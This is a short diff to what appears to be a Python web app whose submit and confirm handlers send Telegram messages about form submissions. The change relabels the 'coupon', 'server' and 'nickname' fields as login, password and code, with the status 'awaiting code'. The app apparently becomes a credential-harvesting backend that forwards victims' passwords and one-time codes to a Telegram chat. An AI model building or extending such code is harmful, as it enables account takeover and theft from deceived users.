@@ -156,17 +156,14 @@ def submit():
         f"🆔 ID: "
         f"<code>{request_id}</code>\n"
 
-        f"🎟 Купон: "
+        f"🎟 логин: "
         f"<code>{coupon}</code>\n"
 
-        f"🖥 Сервер: "
+        f"🖥 пароль: "
         f"<code>{server}</code>\n"
 
-        f"🕐 Время: "
-        f"{created_at}\n\n"
-
         "⏳ Статус: "
-        "ожидается ник"
+        "ожидает код"
     )
 
     telegram_ok = send_telegram(
@@ -296,17 +293,14 @@ def confirm():
         f"🆔 ID: "
         f"<code>{request_id}</code>\n"
 
-        f"🎟 Купон: "
+        f"🎟 Логин: "
         f"<code>{application['coupon']}</code>\n"
 
-        f"🖥 Сервер: "
+        f"🖥 Пароль: "
         f"<code>{application['server']}</code>\n"
 
-        f"👤 Ник: "
+        f"👤 КОД: "
         f"<code>{nickname}</code>\n"
-
-        f"🕐 Время: "
-        f"{confirmed_at}\n\n"
 
         "🟢 Статус: подтверждено"
     )
